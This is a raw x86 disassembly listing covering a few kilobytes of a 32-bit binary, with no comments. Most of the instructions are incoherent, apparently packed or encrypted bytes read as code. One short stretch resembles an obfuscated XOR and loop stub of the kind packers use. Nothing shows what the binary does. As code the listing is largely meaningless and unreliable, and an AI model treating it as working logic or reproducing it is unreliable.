  410a2d:	test   eax,0xaa743b02
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x410a78
  410a3a:	xchg   ecx,eax
  410a3b:	popa   
  410a3c:	rcl    DWORD PTR [ecx-0x6d91cae0],1
  410a42:	loop   0x410a00
  410a44:	fbstp  TBYTE PTR [eax-0x71e700c9]
  410a4a:	enter  0xf21a,0xdc
  410a4e:	pop    ds
  410a4f:	ds shl dl,cl
  410a52:	out    dx,al
  410a53:	sub    BYTE PTR [ecx+edx*4],0xc0
  410a57:	xor    dh,BYTE PTR [ecx+0x6cd577bc]
  410a5d:	mov    ?,WORD PTR [ebx+0x58ba997b]
  410a63:	mov    fs,WORD PTR [ecx]
  410a65:	imul   eax,DWORD PTR [ecx+edi*8],0xcb9a05df
  410a6c:	dec    ebx
  410a6d:	push   ebx
  410a6e:	ffree  st(1)
  410a70:	inc    ebp
  410a71:	adc    BYTE PTR [esi],al
  410a73:	mov    edi,0x9f3b2b14
  410a78:	pop    eax
  410a79:	and    edi,DWORD PTR [ecx]
  410a7b:	call   0xb199f46
  410a80:	sub    BYTE PTR [eax+0x19],ch
  410a83:	jnp    0x410a43
  410a85:	mov    ebp,0x35bfe029
  410a8a:	pmaddwd mm4,QWORD PTR [edi]
  410a8d:	int3   
  410a8e:	cmp    BYTE PTR [esi],ah
  410a90:	xchg   ebp,eax
  410a91:	cmp    BYTE PTR [esi+ebp*1-0x6d5415da],dh
  410a98:	dec    ebx
  410a99:	or     bl,BYTE PTR [esi-0x64]
  410a9c:	cmp    al,0x4a
  410a9e:	inc    esi
  410a9f:	lock (bad) 
  410aa1:	xchg   DWORD PTR [edi-0x1814263],ebp
  410aa7:	adc    eax,0xd58d1883
  410aac:	sbb    ebx,DWORD PTR [eax-0x493a240a]
  410ab2:	add    al,0xbc
  410ab4:	xchg   ebp,eax
  410ab5:	dec    ebp
  410ab6:	or     eax,0xdbdc91b4
  410abb:	dec    ebx
  410abc:	xor    eax,0x37b9a4e5
  410ac1:	jno    0x410ac6
  410ac3:	add    ch,BYTE PTR [ebx+0x1b7da64a]
  410ac9:	push   ebp
  410aca:	and    eax,0x5293ca46
  410acf:	ds push esi
  410ad1:	retf   0x699b
  410ad4:	cmp    eax,0x6029dc6b
  410ad9:	fwait
  410ada:	fs pop ds
  410adc:	xchg   ebx,eax
  410add:	or     ebx,DWORD PTR [ebx+0x4a]
  410ae0:	jmp    0x5667f892
  410ae5:	mov    eax,0xbcb5f869
  410aea:	push   edx
  410aeb:	js     0x410af5
  410aed:	(bad)  
  410aef:	push   edx
  410af0:	push   eax
  410af1:	pop    esp
  410af2:	sub    al,0x11
  410af4:	inc    eax
  410af5:	mov    al,ds:0xdad5f39b
  410afa:	xchg   DWORD PTR [edx-0x2d],ebp
  410afd:	mov    ah,0xe9
  410aff:	mov    BYTE PTR ds:0x1154967b,bh
  410b05:	add    al,0xf6
  410b07:	mov    ebx,0xe1347b09
  410b0c:	rol    DWORD PTR [ecx+0x53b6fb52],1
  410b12:	test   BYTE PTR [ebx+0x3919e785],dh
  410b18:	push   ds
  410b19:	sbb    DWORD PTR [ebx-0xc6cf952],edi
  410b1f:	sub    eax,0x3f977f3b
  410b24:	jl     0x410b1b
  410b26:	push   0xd
  410b28:	adc    eax,DWORD PTR [edx-0x1a3c5cc9]
  410b2e:	sbb    al,0x64
  410b30:	and    eax,0xf57ad029
  410b35:	out    0x26,eax
  410b37:	fldcw  WORD PTR [edx]
  410b39:	inc    ecx
  410b3a:	jns    0x410b56
  410b3c:	aam    0xaa
  410b3e:	or     ebp,esp
  410b40:	xor    eax,0x188efed2
  410b45:	sar    DWORD PTR [edx-0x4a],cl
  410b48:	fcmovnb st,st(4)
  410b4a:	pusha  
  410b4b:	jp     0x410bc3
  410b4d:	pushf  
  410b4e:	scas   eax,DWORD PTR es:[edi]
  410b4f:	push   0x4192be29
  410b54:	cs es jecxz 0x410b86
  410b58:	cld    
  410b59:	test   al,0xd7
  410b5b:	cwde   
  410b5c:	test   eax,0xc08114c9
  410b61:	or     bl,ch
  410b63:	lds    ecx,FWORD PTR [ebx+0x40]
  410b66:	push   ebp
  410b67:	jmp    0x31e45f20
  410b6c:	sbb    eax,0xd062e8b
  410b71:	cs test al,0x2c
  410b74:	lods   al,BYTE PTR ds:[esi]
  410b75:	mov    ds:0x13ebfb83,al
  410b7a:	aas    
  410b7b:	(bad)  
  410b7c:	jbe    0x410b0b
  410b7e:	call   0x1a79:0x5e682e4b
  410b85:	mov    eax,0xf6499c12
  410b8a:	push   cx
  410b8c:	pusha  
  410b8d:	loope  0x410b4f
  410b8f:	jno    0x410b6a
  410b91:	sub    DWORD PTR [ebx+0x58],ebx
  410b94:	pop    es
  410b95:	or     al,0x97
  410b97:	(bad)  
  410b98:	(bad)  
  410b99:	sbb    BYTE PTR [edi+0x6f0a2059],dh
  410b9f:	and    dl,BYTE PTR [ebp+0x3cc88b74]
  410ba5:	dec    edx
  410ba6:	jnp    0x410bbb
  410ba8:	fld    DWORD PTR [eax-0x51]
  410bab:	je     0x410b36
  410bad:	jnp    0x410c11
  410baf:	push   cs
  410bb0:	pop    ebx
  410bb1:	mov    ds:0x43f7fc87,al
  410bb6:	push   esp
  410bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bb8:	mov    dl,0xe4
  410bba:	shl    edi,0xbd
  410bbd:	add    DWORD PTR [esi+0x45adcce1],0x7
  410bc4:	and    bh,al
  410bc6:	scas   eax,DWORD PTR es:[edi]
  410bc7:	xchg   esp,eax
  410bc8:	scas   eax,DWORD PTR es:[edi]
  410bc9:	addr16 dec ebx
  410bcb:	push   eax
  410bcc:	(bad)  
  410bce:	mov    dh,0x4
  410bd0:	jno    0x410b72
  410bd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bd3:	pop    eax
  410bd4:	popf   
  410bd5:	and    al,BYTE PTR [eax]
  410bd7:	jo     0x410b95
  410bd9:	dec    edi
  410bda:	cwde   
  410bdb:	pop    esp
  410bdc:	rcl    eax,cl
  410bde:	ss inc esi
  410be0:	mov    cl,0xdc
  410be2:	leave  
  410be3:	shr    BYTE PTR [ecx-0x1b],cl
  410be6:	bound  edi,QWORD PTR [eax]
  410be8:	push   ds
  410be9:	sbb    BYTE PTR [esi+eax*8],bh
  410bec:	cmp    al,0x17
  410bee:	adc    eax,0xea265c01
  410bf4:	jbe    0x410bcb
  410bf6:	fwait
  410bf7:	in     eax,dx
  410bf8:	or     eax,0x7a1e6197
  410bfd:	aad    0x6e
  410bff:	xor    esp,DWORD PTR [ecx+ebx*8]
  410c02:	pop    edx
  410c03:	fld    QWORD PTR cs:[ecx]
  410c06:	mov    esp,0x510b8f02
  410c0b:	inc    esp
  410c0c:	out    dx,al
  410c0d:	test   BYTE PTR [ebx+0x58],bh
  410c10:	bound  ecx,QWORD PTR [esi+0x44bf8e3f]
  410c16:	aas    
  410c17:	jg     0x410c53
  410c19:	jp     0x410bf4
  410c1b:	jnp    0x410c3a
  410c1d:	xor    eax,0xd2dd4513
  410c22:	xchg   DWORD PTR [ecx-0x28ed9197],ecx
  410c28:	mov    dl,0x95
  410c2a:	aad    0x53
  410c2c:	movlps xmm7,QWORD PTR [esi]
  410c2f:	sbb    bh,BYTE PTR [ebp-0x20]
  410c32:	sub    DWORD PTR [eax+0x33],edx
  410c35:	sub    edi,DWORD PTR [edi+0x5e]
  410c38:	(bad)  
  410c39:	xlat   BYTE PTR ds:[ebx]
  410c3a:	ins    DWORD PTR es:[edi],dx
  410c3b:	(bad)  
  410c3c:	sbb    al,0x25
  410c3e:	fiadd  WORD PTR [ebx+0x6a2e97e7]
  410c44:	mov    dl,0xbf
  410c46:	lods   al,BYTE PTR ds:[esi]
  410c47:	mov    al,ds:0x7ae9e36b
  410c4c:	or     bl,BYTE PTR [edi+ebx*1-0x58]
  410c50:	repz push ss
  410c52:	imul   eax,edx,0x1865db3c
  410c58:	sub    ch,BYTE PTR [ebp+0x5c]
  410c5b:	pop    ds
  410c5c:	mov    esi,0x579a434
  410c61:	cdq    
  410c62:	(bad)  
  410c66:	fs aam 0xa
  410c69:	mov    BYTE PTR [ecx+0x74],0xac
  410c6d:	mov    ebx,0xe9b411e
  410c72:	push   ecx
  410c73:	gs gs adc eax,0x87ec3a4e
  410c7a:	ins    DWORD PTR es:[edi],dx
  410c7b:	mov    edi,0x9840b794
  410c80:	sbb    bl,cl
  410c82:	push   es
  410c83:	jmp    0x278a:0x485a6f45
  410c8a:	push   ss
  410c8b:	out    0xe6,al
  410c8d:	loope  0x410c3c
  410c8f:	xor    eax,0xae4717a3
  410c94:	xor    eax,0xf3f7473a
  410c99:	retf   
  410c9a:	sub    al,0x8b
  410c9c:	rcr    BYTE PTR [ecx+0x4b],0xdd
  410ca0:	ja     0x410cdd
  410ca2:	in     eax,0x14
  410ca4:	xor    bl,BYTE PTR [esi-0x7fa7a6de]
  410caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cab:	mov    ch,BYTE PTR [edi]
  410cad:	push   edi
  410cae:	fld    QWORD PTR [edi-0x37]
  410cb1:	inc    esp
  410cb2:	jg     0x410ca2
  410cb4:	jns    0x410c72
  410cb6:	dec    ebp
  410cb7:	loope  0x410c94
  410cb9:	jae    0x410c47
  410cbb:	jae    0x410cbe
  410cbd:	or     al,0x63
  410cbf:	and    ah,BYTE PTR [edx]
  410cc1:	fdiv   DWORD PTR [ebx]
  410cc3:	(bad)  
  410cc4:	sub    edi,DWORD PTR [eax]
  410cc6:	jmp    DWORD PTR [edx]
  410cc8:	pop    eax
  410cc9:	les    edi,FWORD PTR [edi]
  410ccb:	push   es
  410ccc:	inc    eax
  410ccd:	jmp    0x3f15:0xfee99573
  410cd4:	adc    eax,DWORD PTR [ecx]
  410cd6:	cmp    edx,esi
  410cd8:	mov    DWORD PTR [ebp+0x10],ecx
  410cdb:	mov    ecx,DWORD PTR ds:0x4345c7
  410ce1:	mov    DWORD PTR [ebp+0x8],0xf34ceba
  410ce8:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  410cef:	mov    ecx,DWORD PTR ds:0x4344e3
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43460b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434613,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x4345c7,0x434583
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434607,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43458f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx-0x4282bd7a],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d7a
  410d7a:	enter  0xf97a,0xa9
  410d7e:	repz cmp DWORD PTR [edx+0x1e426836],ecx
  410d85:	cli    
  410d86:	stc    
  410d87:	mov    al,ds:0x5dc50d04
  410d8c:	and    al,BYTE PTR [ecx+ebx*2]
  410d8f:	push   esi
  410d90:	mov    eax,ds:0xf67cf819
  410d95:	xchg   edx,eax
  410d96:	or     BYTE PTR [ecx+0x11],ch
  410d99:	and    dh,BYTE PTR [ebx-0x5c678524]
  410d9f:	cmp    DWORD PTR [ecx-0x642865b1],0x2d
  410da6:	sub    bl,dh
  410da8:	fwait
  410da9:	js     0x410d68
  410dab:	jecxz  0x410e17
  410dad:	mov    esi,0x10f852f3
  410db2:	pop    eax
  410db3:	jne    0x410de1
  410db5:	xchg   ebp,eax
  410db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410db7:	cmp    eax,DWORD PTR [ecx-0x3d]
  410dba:	inc    esp
  410dbb:	popa   
  410dbc:	je     0x410d87
  410dbe:	jl     0x410d4a
  410dc0:	lock jmp 0x410e19
  410dc3:	(bad)  [edx]
  410dc5:	lods   eax,DWORD PTR ds:[esi]
  410dc6:	xchg   DWORD PTR [edx],esp
  410dc8:	sar    esi,1
  410dca:	dec    ecx
  410dcb:	outs   dx,DWORD PTR ds:[esi]
  410dcc:	shl    BYTE PTR [edx-0x21],cl
  410dcf:	por    mm0,mm0
  410dd2:	stos   DWORD PTR es:[edi],eax
  410dd3:	imul   ecx,DWORD PTR [edi-0x3b],0x28
  410dd7:	sub    esi,0xffffffda
  410dda:	sbb    DWORD PTR [ebp-0x5b],ecx
  410ddd:	retf   
  410dde:	pop    ebx
  410ddf:	adc    dl,BYTE PTR [edx+0x72]
  410de2:	imul   edx,DWORD PTR [ecx+0x51e4e94a],0xdec41439
  410dec:	loop   0x410e54
  410dee:	ins    BYTE PTR es:[edi],dx
  410def:	out    0x4d,al
  410df1:	mov    esi,DWORD PTR ds:0xb7d1ad5c
  410df7:	js     0x410def
  410df9:	xor    BYTE PTR [ebx+0x15e2807c],bl
  410dff:	pop    esp
  410e00:	mov    eax,0x8c8f797c
  410e05:	adc    al,0x87
  410e07:	adc    al,0xd6
  410e09:	ror    BYTE PTR [eax-0x7a],1
  410e0c:	sub    BYTE PTR fs:[ebp+0x28],ch
  410e10:	add    esi,DWORD PTR [ebp-0x19485e62]
  410e16:	retf   
  410e17:	sub    eax,0xf2912a44
  410e1c:	xchg   edi,eax
  410e1d:	cmc    
  410e1e:	pushf  
  410e1f:	retf   
  410e20:	or     bh,BYTE PTR [ebp-0x4b]
  410e23:	and    esp,DWORD PTR [edi+0x7015a152]
  410e29:	add    ecx,DWORD PTR [edi]
  410e2b:	jle    0x410dd2
  410e2d:	leave  
  410e2e:	dec    edi
  410e2f:	jno    0x410dfb
  410e31:	or     ch,BYTE PTR [edx]
  410e33:	jae    0x410e01
  410e35:	and    al,0xe7
  410e37:	xchg   ebp,eax
  410e38:	adc    al,0xff
  410e3a:	xor    bl,al
  410e3c:	sub    BYTE PTR [edi+0x2f98c56c],ah
  410e42:	inc    esp
  410e44:	test   eax,0x5105af71
  410e49:	ja     0x410eae
  410e4b:	inc    edx
  410e4c:	jnp    0x410e25
  410e4e:	out    dx,al
  410e4f:	cs (bad) 
  410e51:	dec    esi
  410e52:	jecxz  0x410ebc
  410e54:	pop    edi
  410e55:	(bad)  
  410e56:	jb     0x410e20
  410e58:	xchg   ebx,eax
  410e59:	fild   WORD PTR [eax*2+0x1523e52]
  410e60:	sbb    BYTE PTR [ebp-0x6a],cl
  410e63:	rol    BYTE PTR ds:0x9a708eed,cl
  410e69:	inc    esp
  410e6a:	inc    esi
  410e6b:	(bad)  
  410e6c:	jmp    0x410e4b
  410e6e:	scas   al,BYTE PTR es:[edi]
  410e6f:	jnp    0x410e69
  410e71:	sbb    al,0xb0
  410e73:	inc    edx
  410e74:	fisttp QWORD PTR [edx]
  410e76:	pushf  
  410e77:	cmp    bh,BYTE PTR [edx-0x1f]
  410e7a:	jge    0x410e71
  410e7c:	mov    WORD PTR [ecx+eiz*8],fs
  410e7f:	inc    esi
  410e80:	jp     0x410ecd
  410e82:	(bad)  
  410e83:	fcom   st(0)
  410e85:	mov    eax,0xd63ccaa8
  410e8a:	lods   eax,DWORD PTR ds:[esi]
  410e8b:	sbb    eax,0xffffffff
  410e8e:	xchg   ecx,eax
  410e8f:	jmp    FWORD PTR [esi-0x33c0da78]
  410e95:	inc    edi
  410e96:	pop    esi
  410e97:	aad    0x89
  410e99:	fmul   st,st(4)
  410e9b:	xlat   BYTE PTR ds:[ebx]
  410e9c:	or     BYTE PTR [ecx+eiz*2+0x3d],al
  410ea0:	pop    edx
  410ea1:	in     eax,dx
  410ea2:	aas    
  410ea3:	xchg   al,al
  410ea5:	add    al,0x9f
  410ea7:	mov    cl,0x7f
  410ea9:	fbld   TBYTE PTR [esi]
  410eab:	call   0x786d4193
  410eb0:	frstor [ecx-0x6a]
  410eb3:	push   ecx
  410eb4:	jecxz  0x410e40
  410eb6:	pop    esp
  410eb7:	mov    ecx,0x1e132deb
  410ebc:	inc    edi
  410ebd:	shl    ecx,1
  410ebf:	push   edx
  410ec0:	(bad)  
  410ec1:	jp     0x410e4e
  410ec3:	aas    
  410ec4:	push   cs
  410ec5:	popa   
  410ec6:	cs retf 
  410ec8:	(bad)  
  410ec9:	jno    0x410f18
  410ecb:	mov    ch,0x3
  410ecd:	sub    BYTE PTR [esi-0x576750b3],al
  410ed3:	mov    dh,0x9a
  410ed5:	pop    ebp
  410ed6:	fdiv   DWORD PTR [esi-0x29654efb]
  410edc:	pushf  
  410edd:	mov    DWORD PTR [edi],edi
  410edf:	cmp    BYTE PTR [edi],0x9a
  410ee2:	popf   
  410ee3:	cmp    eax,0x655b7ae5
  410ee8:	pop    ds
  410ee9:	hlt    
  410eea:	and    BYTE PTR [edi],bh
  410eec:	out    dx,al
  410eed:	mov    al,0x29
  410eef:	lahf   
  410ef0:	out    dx,al
  410ef1:	sub    DWORD PTR [ebp+eiz*4-0x2c],edi
  410ef5:	pop    edi
  410ef6:	pop    ds
  410ef7:	or     bh,0xc3
  410efa:	fldcw  WORD PTR [ebx]
  410efc:	enter  0x5025,0xec
  410f00:	jl     0x410ebb
  410f02:	test   BYTE PTR [edi+0xf58a59c],dl
  410f08:	xlat   BYTE PTR ds:[ebx]
  410f09:	fcom   QWORD PTR [edx-0x5d976be1]
  410f0f:	loop   0x410f3b
  410f11:	popf   
  410f12:	shl    BYTE PTR [eax-0x3d],0xc9
  410f16:	jo     0x410efb
  410f18:	sub    BYTE PTR [ebp+0x46baf6ca],dl
  410f1e:	or     DWORD PTR [ecx+0x77],eax
  410f21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f22:	push   esi
  410f23:	and    dl,BYTE PTR [edi-0x4f5f69e1]
  410f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f2a:	fninit 
  410f2c:	in     eax,dx
  410f2d:	dec    eax
  410f2e:	cmp    DWORD PTR [edx-0xe],eax
  410f31:	repnz shl BYTE PTR [esi+0x1293741c],1
  410f38:	sub    ch,BYTE PTR [ecx*4+0x2b060fc3]
  410f3f:	fadd   st,st(0)
  410f41:	fst    DWORD PTR [eax-0x7]
  410f44:	jnp    0x410f22
  410f46:	sbb    ch,BYTE PTR [edx]
  410f48:	fisttp WORD PTR [edx-0x5]
  410f4b:	push   eax
  410f4c:	scas   al,BYTE PTR es:[edi]
  410f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f4e:	cli    
  410f4f:	push   0xfffffff2
  410f51:	popf   
  410f52:	dec    edx
  410f53:	js     0x3208b7a7
  410f59:	add    DWORD PTR [edx+0x79],ebx
  410f5c:	fist   DWORD PTR ds:0xb9345879
  410f62:	pusha  
  410f63:	xchg   edx,eax
  410f64:	jp     0x410fc3
  410f66:	lea    eax,[ebx+edx*8]
  410f69:	repnz (bad) 
  410f6b:	cmc    
  410f6c:	or     BYTE PTR [ecx-0x50cc0482],bl
  410f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f73:	xchg   ebx,eax
  410f74:	push   edx
  410f75:	inc    edi
  410f76:	out    dx,eax
  410f77:	es adc eax,eax
  410f7a:	pop    esp
  410f7b:	mov    ecx,0xc5c63e44
  410f80:	imul   BYTE PTR [edi+eax*1-0x9]
  410f84:	xor    al,0xe8
  410f86:	push   ds
  410f87:	push   0x57
  410f89:	push   esp
  410f8a:	pop    ebx
  410f8b:	sbb    eax,0xaf5554f5
  410f90:	ins    BYTE PTR es:[edi],dx
  410f91:	cld    
  410f92:	xchg   ecx,eax
  410f93:	test   al,0x39
  410f95:	leave  
  410f96:	ja     0x411009
  410f98:	add    bh,BYTE PTR [esi-0x42bb0282]
  410f9e:	or     al,0xb
  410fa0:	cdq    
  410fa1:	rol    DWORD PTR [ebx-0x415a6ac7],0x9f
  410fa8:	xchg   edx,eax
  410fa9:	xchg   edx,eax
  410faa:	add    BYTE PTR [esi+ebx*4-0xe2def5e],0x93
  410fb2:	xchg   DWORD PTR [ebp-0x20],ecx
  410fb5:	cld    
  410fb6:	adc    ch,bl
  410fb8:	xchg   esp,eax
  410fb9:	rol    BYTE PTR [edi-0x1d580c78],0xe3
  410fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fc1:	dec    edi
  410fc2:	sbb    cl,BYTE PTR [edx+ecx*2-0x1f]
  410fc6:	adc    ecx,DWORD PTR [esi]
  410fc8:	inc    eax
  410fc9:	add    esi,DWORD PTR [esi]
  410fcb:	addr16 push esp
  410fcd:	dec    esp
  410fce:	dec    edi
  410fcf:	inc    esp
  410fd0:	imul   esi
  410fd2:	ret    0xd8be
  410fd5:	and    eax,DWORD PTR [ebx+0x133a7911]
  410fdb:	xor    esp,esi
  410fdd:	inc    ebp
  410fde:	div    esi
  410fe0:	inc    BYTE PTR [ebp-0x2d]
  410fe3:	cmp    DWORD PTR [esi-0x3472dd88],esp
  410fe9:	or     ch,BYTE PTR [edx+0x18f2befa]
  410fef:	cs sbb ebx,esp
  410ff2:	shl    DWORD PTR [ecx],0xf3
  410ff5:	ins    DWORD PTR es:[edi],dx
  410ff6:	add    al,0x29
  410ff8:	scas   eax,DWORD PTR es:[edi]
  410ff9:	push   0x7
  410ffb:	mov    dl,0x9a
  410ffd:	jno    0x411061
  410fff:	(bad)  
  411000:	(bad)  
  411001:	mul    dh
  411003:	pop    ecx
  411004:	fwait
  411005:	jnp    0x411077
  411007:	neg    BYTE PTR [ebx+0x74]
  41100a:	or     esp,DWORD PTR [edi-0x5f]
  41100d:	ins    BYTE PTR es:[edi],dx
  41100e:	mov    bl,0x5e
  411010:	cmp    BYTE PTR [edx+eax*8-0x12],ah
  411014:	xor    eax,0x819f9644
  411019:	shl    DWORD PTR [edi-0x73],0xcd
  41101d:	dec    DWORD PTR [ebx+0x3f033f1]
  411023:	jne    0x41102d
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x26a44754
  411040:	std    
  411041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411042:	push   0x9d7e7e4f
  411047:	js     0x4110c7
  411049:	jle    0x411000
  41104b:	push   edx
  41104c:	mov    al,0x5f
  41104e:	or     dl,BYTE PTR [ebp+0x53]
  411051:	add    BYTE PTR [ecx-0x1f49c1a1],ah
  411057:	in     eax,0xef
  411059:	pop    eax
  41105a:	add    ecx,DWORD PTR [edx+0x34baf5ed]
  411060:	fild   WORD PTR [ebx-0x1c]
  411063:	into   
  411064:	int3   
  411065:	lahf   
  411066:	push   ecx
  411067:	pop    edi
  411068:	xchg   esp,eax
  411069:	mov    ds:0x7e539150,al
  41106e:	add    bl,BYTE PTR [ebx-0x3c]
  411071:	xor    edi,DWORD PTR [ebx+edi*2+0x635c4e7]
  411078:	push   esp
  411079:	sub    bl,BYTE PTR [eax]
  41107b:	jno    0x41104b
  41107d:	mov    eax,ds:0x32e0e8f3
  411082:	xchg   DWORD PTR [esi+0x3bdee4ed],edi
  411088:	sbb    DWORD PTR [edx],eax
  41108a:	inc    eax
  41108b:	jecxz  0x411108
  41108d:	bswap  ebx
  41108f:	ret    0x4a86
  411092:	popf   
  411093:	icebp  
  411094:	sbb    ah,BYTE PTR [ebp-0x18e1ad02]
  41109a:	mov    eax,ds:0xbbbb7bf9
  4110a0:	sbb    dh,BYTE PTR [esi]
  4110a2:	jo     0x41110a
  4110a4:	jne    0x41105b
  4110a6:	push   0xffffff8a
  4110a8:	nop
  4110a9:	mov    bh,0xb2
  4110ab:	cld    
  4110ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ad:	mov    al,dh
  4110af:	(bad)  
  4110b0:	sbb    DWORD PTR [eax+0x4dcc62bb],ecx
  4110b6:	add    DWORD PTR [ebx+0xc52d0dc],0x3f50ac2
  4110c0:	pop    esp
  4110c1:	xchg   BYTE PTR [eax],ah
  4110c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c4:	test   BYTE PTR [edx],cl
  4110c6:	sub    al,0xfc
  4110c8:	push   esi
  4110c9:	mov    ds:0x85d78fe4,al
  4110ce:	js     0x41109b
  4110d0:	pop    ss
  4110d1:	jne    0x41114d
  4110d3:	and    dl,BYTE PTR [eax+0x16db510d]
  4110d9:	push   edi
  4110da:	xchg   edi,eax
  4110db:	leave  
  4110dc:	inc    eax
  4110dd:	or     ebp,DWORD PTR [ebp-0x64fcbeb3]
  4110e3:	stc    
  4110e4:	inc    edi
  4110e5:	adc    edi,0x2f
  4110e8:	push   cs
  4110e9:	sub    al,0xa3
  4110eb:	mov    ds:0x12cdcf,eax
  4110f0:	(bad)  
  4110f3:	cmc    
  4110f4:	lock sbb DWORD PTR [edx+0x7f26c715],esi
  4110fb:	mov    ebx,0x65777634
  411100:	dec    esp
  411101:	cmp    BYTE PTR [edi],bl
  411103:	sub    dl,ah
  411105:	in     eax,dx
  411106:	mov    ds:0xbca8b7b9,al
  41110b:	retf   
  41110c:	fsubr  DWORD PTR [edx-0x3b]
  41110f:	(bad)  
  411110:	ror    dh,cl
  411112:	pop    ds
  411113:	retf   0xdea7
  411116:	mov    dl,0xeb
  411118:	hlt    
  411119:	inc    esp
  41111a:	sbb    eax,0x117ccdb1
  41111f:	cmp    ecx,DWORD PTR [esi]
  411121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411122:	or     ah,ah
  411124:	pop    ebx
  411125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411126:	fwait
  411127:	test   eax,0xe24f504e
  41112c:	or     BYTE PTR [eax],0x26
  41112f:	clc    
  411130:	(bad)  
  411131:	adc    ebp,DWORD PTR [eax]
  411133:	mov    ah,BYTE PTR [edi+0x39]
  411136:	stos   BYTE PTR es:[edi],al
  411137:	mov    ah,0xe2
  411139:	mov    DWORD PTR [bx+di-0x4735],edi
  41113e:	dec    ebp
  41113f:	add    esi,DWORD PTR [eax+0xe6e9649]
  411145:	pop    esp
  411146:	pmulhw mm2,QWORD PTR [ebp-0x788f8a96]
  41114d:	popf   
  41114e:	xchg   BYTE PTR [eax],cl
  411150:	mov    edx,0xc0283a72
  411155:	fwait
  411156:	jle    0x411165
  411158:	push   ds
  411159:	arpl   ax,dx
  41115b:	mov    BYTE PTR [ebx+edi*2],ah
  41115e:	lods   al,BYTE PTR ds:[esi]
  41115f:	sub    bl,ah
  411161:	enter  0xefc5,0x43
  411165:	loop   0x411144
  411167:	add    eax,0x37fe2d8d
  41116c:	out    0xbb,eax
  41116e:	dec    ebp
  41116f:	adc    edi,DWORD PTR [ebp+ebp*8-0x72]
  411173:	shl    BYTE PTR ds:0xaee1c281,cl
  411179:	cwde   
  41117a:	sub    DWORD PTR [ecx],edx
  41117c:	pop    ebx
  41117d:	push   edi
  41117e:	xor    ebx,DWORD PTR [ebx-0x27]
  411181:	scas   eax,DWORD PTR es:[edi]
  411182:	fnstenv [edx-0x79]
  411185:	(bad)  
  411186:	mov    eax,0xfb721bac
  41118b:	pop    esp
  41118c:	push   ss
  41118d:	mov    dl,0xcf
  41118f:	out    dx,al
  411190:	push   esp
  411191:	xlat   BYTE PTR ds:[ebx]
  411192:	fs pop ecx
  411194:	jp     0x41118e
  411196:	dec    eax
  411197:	mov    ds:0x811386d9,eax
  41119c:	stc    
  41119d:	imul   edi,DWORD PTR [edx-0x30],0x6
  4111a1:	xor    BYTE PTR [ebx+0xa],dl
  4111a4:	pop    edi
  4111a5:	out    0xfe,al
  4111a7:	inc    esi
  4111a8:	mov    al,bl
  4111aa:	pop    ebp
  4111ab:	out    0x4b,al
  4111ad:	add    BYTE PTR [ebx+0x33313fdd],bl
  4111b3:	cmp    edi,edx
  4111b5:	ins    DWORD PTR es:[edi],dx
  4111b6:	sub    esp,DWORD PTR [ebx-0xe]
  4111b9:	pop    es
  4111ba:	jnp    0x411151
  4111bc:	jle    0x41122c
  4111be:	xchg   ebx,eax
  4111bf:	sub    eax,0x59e9c4ae
  4111c4:	add    BYTE PTR [esi-0x12d67481],bh
  4111ca:	repnz shl BYTE PTR [eax-0x801a7c6],0x81
  4111d2:	lods   al,BYTE PTR ds:[esi]
  4111d3:	add    BYTE PTR [ebp+edx*1-0x13],ah
  4111d7:	das    
  4111d8:	scas   eax,DWORD PTR es:[edi]
  4111d9:	adc    esp,DWORD PTR [ecx+0x7c]
  4111dc:	jg     0x4111c6
  4111de:	mov    eax,ds:0x10a03841
  4111e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111e4:	shl    DWORD PTR [ecx-0x3c],cl
  4111e7:	jno    0x4111bf
  4111e9:	mov    bh,BYTE PTR [edx-0x46de845c]
  4111ef:	add    edx,edi
  4111f1:	in     eax,0x1e
  4111f3:	in     al,dx
  4111f4:	sar    DWORD PTR [eax*2-0x568c280],cl
